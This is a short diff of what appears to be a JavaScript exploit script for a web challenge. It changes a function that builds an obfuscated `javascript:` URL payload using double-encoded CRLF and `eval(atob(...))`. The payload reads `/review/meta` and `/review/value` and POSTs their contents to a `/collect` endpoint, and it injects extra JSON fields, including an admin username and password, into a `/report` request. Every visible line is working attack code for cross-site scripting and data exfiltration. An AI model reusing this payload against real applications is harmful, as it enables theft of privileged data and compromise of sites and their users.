@@ -91,7 +91,7 @@ function checkIndirection(expected) {
 }
 
 async function recoverThroughApp() {
-  const js = "fetch('/review/value').then(r=>r.text()).then(t=>fetch('/collect',{method:'POST',headers:{'Content-Type':'text/plain'},body:t}))";
+  const js = "Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>fetch('/collect',{method:'POST',headers:{'Content-Type':'text/plain'},body:m.channel+':'+t}))";
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
   await request('POST', '/report', {
